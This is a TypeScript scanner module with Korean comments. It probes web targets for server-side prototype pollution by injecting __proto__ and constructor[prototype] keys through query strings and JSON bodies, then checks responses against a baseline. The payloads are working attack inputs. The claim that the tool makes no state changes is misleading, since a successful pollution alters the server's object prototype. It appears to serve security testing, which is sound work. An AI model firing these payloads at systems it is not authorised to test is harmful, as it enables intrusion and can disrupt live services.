/**
 * proto_pollution_probe — (서버측) 프로토타입 오염 신호 탐지.
 *
 * 파라미터에 `__proto__[rcppN]=1`, `constructor[prototype][rcppN]=1`(쿼리/폼) 또는
 * JSON 바디 대상 `{"__proto__":{"rcppN":1}}` 를 주입해, 응답 본문의 **병합 지점**에
 * 오염 키(rcppN)가 반영되는지 본다. 실행마다 무작위 키를 써서 캐시/정적 에코와 구분한다.
 *   - baseline(평문 요청) 본문에는 키가 없고, 오염 주입 응답에만 키가 보이면 실증(medium)
 * FP 방어: 원문 에코(입력이 그대로 반사되는 경우)는 baseline 비교로 배제 — 주입 값과
 * "동일한" 문자열이 baseline 에도 없는지 요구한다. 상태 변경 없음(관찰 전용).
 */

import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { authGet, authPost, baseUrl, joinPath, withQuery } from "./util.js";

const DEFAULT_PARAMS = ["cfg", "config", "options", "settings", "data", "json", "body", "q", "param", "obj", "payload"];
const DEFAULT_PATHS = ["/"];
const MAX_PATHS = 8;
const MAX_PARAMS = 6;

export const protoPollutionProbe: Tool = {
  name: "proto_pollution_probe",
  description:
    "쿼리/JSON 파라미터에 __proto__/constructor[prototype] 오염 키를 주입해 서버측 병합 지점 반영을 탐지한다. baseline 대비 오염 키만 등장하면 실증(medium). 원문 에코는 baseline 비교로 배제.",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const paths = pickPaths(args);
    const params = pickParams(args);
    const rand = `rcpp${Math.random().toString(36).slice(2, 8)}`; // 실행마다 무작위 오염 키
    const val = "1";

    // withQuery 는 키의 [ ] 를 URL 인코딩한다 → 일부 파서가 병합하지 않으므로,
    // 병합 지점에 도달하는 raw(비-인코딩) 키를 그대로 보낼 수 있는 직렬화를 쓴다.
    const buildUrl = (path0: string, inj: Record<string, string>): string => {
      const qs = Object.entries(inj)
        .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
        .join("&");
      return joinPath(base, `${path0}${path0.includes("?") ? "&" : "?"}${qs}`);
    };


    for (const path of paths) {
      for (const param of params.slice(0, MAX_PARAMS)) {
        // baseline — 평문 요청. 오염 키가 baseline 에도 있으면 정적 에코 → 판정 불가.
        let baseline;
        try {
          baseline = await authGet(ctx, joinPath(base, withQuery(path, { [param]: "x" })));
        } catch {
          continue;
        }
        if (baseline.status >= 500) continue;
        if (baseline.body.includes(rand)) continue; // 우연 충돌 방어

        // 쿼리/폼 변형: __proto__[key]=1, constructor[prototype][key]=1
        const variants: Array<Record<string, string>> = [
          { [`${param}[__proto__][${rand}]`]: val },
          { [`${param}[constructor][prototype][${rand}]`]: val },
        ];
        for (const inj of variants) {
          let res;
          try {
            res = await authGet(ctx, buildUrl(path, inj));
          } catch {
            continue;
          }
          const merged = decodedEcho(res.body, rand);
          if (merged && !baseline.body.includes(rand)) {
            const observed = merged.slice(0, 80);
            return {
              ok: true,
              summary: `프로토타입 오염 신호: ${path} 의 '${param}' 병합 지점에 오염 키 반영`,
              fingerprint: { indicators: [`proto-pollution ${path}?${param}`] },
              data: {
                severity: "medium",
                title: `서버측 프로토타입 오염 (param=${param})`,
                evidence: `프로토타입 오염 실증: 병합 지점에서 오염 키 반영 (baseline 부재) — ${path}?${param} 에서 '${rand}' 관측: ${observed}`,
                param,
                key: rand,
              },
            };
          }
        }

        // JSON 바디 변형: {"param":{"__proto__":{"rcppN":1}}} (POST 엔드포인트)
        const jsonHit = await jsonPollution(ctx, base, path, param, rand);
        if (jsonHit) {
          return {
            ok: true,
            summary: `프로토타입 오염 신호(JSON): ${path} 의 '${param}' 병합 지점에 오염 키 반영`,
            fingerprint: { indicators: [`proto-pollution ${path}?${param}`] },
            data: {
              severity: "medium",
              title: `서버측 프로토타입 오염 (param=${param})`,
              evidence: `프로토타입 오염 실증: 병합 지점에서 오염 키 반영 (baseline 부재, JSON POST) — '${rand}' 관측`,
              param,
              key: rand,
            },
          };
        }
      }
    }
    return { ok: false, summary: `프로토타입 오염 미탐지 (paths=${paths.join(",")}, params=${params.join(",")})` };
  },
};

/** JSON `{"param":{"__proto__":{"rcppN":1}}}` POST → 응답에 키 반영 확인. */
async function jsonPollution(ctx: ToolContext, base: string, path: string, param: string, rand: string): Promise<boolean> {
  try {
    const body = JSON.stringify({ [param]: { __proto__: { [rand]: "1" } } });
    const res = await authPost(ctx, joinPath(base, path), body, { contentType: "application/json", cap: 8000 });
    return decodedEcho(res.body, rand) !== null;
  } catch {
    return false;
  }
}

/** URL 디코드(이중) 후 키가 등장하면 그 근처 문자열 반환. 없으면 null. */
function decodedEcho(body: string, rand: string): string | null {
  if (body.includes(rand)) return body.slice(Math.max(0, body.indexOf(rand) - 40), body.indexOf(rand) + 40);
  let d = body;
  try {
    d = decodeURIComponent(body);
  } catch {
    return null;
  }
  const i = d.indexOf(rand);
  return i >= 0 ? d.slice(Math.max(0, i - 40), i + 40) : null;
}

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PATHS);
  }
  return DEFAULT_PATHS;
}

function pickParams(args: Record<string, unknown>): string[] {
  if (typeof args.param === "string" && args.param) return [args.param];
  if (Array.isArray(args.params)) {
    const ps = args.params.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PARAMS);
  }
  return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
}